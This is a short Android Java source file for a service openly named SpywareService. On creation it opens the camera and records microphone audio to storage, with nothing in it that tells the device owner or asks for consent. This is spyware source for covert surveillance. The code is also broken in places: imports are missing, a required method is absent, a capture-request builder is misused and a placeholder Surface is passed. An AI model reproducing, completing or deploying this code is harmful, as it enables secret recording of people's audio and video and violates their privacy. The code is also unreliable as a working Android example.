// Example in Java for Android
import android.content.Context;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import android.view.Surface;

import java.io.IOException;
import java.util.Collections;

public class SpywareService extends Service {

 private CameraDevice cameraDevice;
 private CameraCaptureSession cameraCaptureSessions;
 private CaptureRequest captureRequest;
 private String cameraId;
 private MediaRecorder mediaRecorder;

 @Override
 public void onCreate() {
 super.onCreate();
 startCamera();
 startAudioRecording();
 }

 private void startCamera() {
 CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
 try {
 cameraId = manager.getCameraIdList()[0];
 manager.openCamera(cameraId, stateCallback, null);
 } catch (CameraAccessException e) {
 e.printStackTrace();
 }
 }

 private void startAudioRecording() {
 mediaRecorder = new MediaRecorder();
 mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
 mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
 mediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/recorded_audio.3gp");
 try {
 mediaRecorder.prepare();
 } catch (IOException e) {
 e.printStackTrace();
 }
 mediaRecorder.start();
 }

 private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
 @Override
 public void onOpened(CameraDevice camera) {
 cameraDevice = camera;
 createCameraPreview();
 }

 @Override
 public void onDisconnected(CameraDevice camera) {
 cameraDevice.close();
 }

 @Override
 public void onError(CameraDevice camera, int error) {
 cameraDevice.close();
 cameraDevice = null;
 }
 };

 protected void createCameraPreview() {
 try {
 Surface surface = new Surface(/* your surface here */);
 captureRequest = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
 captureRequest.addTarget(surface);
 cameraDevice.createCaptureSession(Collections.singletonList(surface), new CameraCaptureSession.StateCallback(){
 @Override
 public void onConfigured(CameraCaptureSession cameraCaptureSession) {
 if (null == cameraDevice) {
 return;
 }
 cameraCaptureSessions = cameraCaptureSession;
 updatePreview();
 }

 @Override
 public void onConfigureFailed(CameraCaptureSession cameraCaptureSession) {
 Toast.makeText(SpywareService.this, "Configuration change", Toast.LENGTH_SHORT).show();
 }
 }, null);
 } catch (CameraAccessException e) {
 e.printStackTrace();
 }
 }

 protected void updatePreview() {
 if (null == cameraDevice) {
 return;
 }
 captureRequest.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
 try {
 cameraCaptureSessions.setRepeatingRequest(captureRequest, null, null);
 } catch (CameraAccessException e) {
 e.printStackTrace();
 }
 }
}
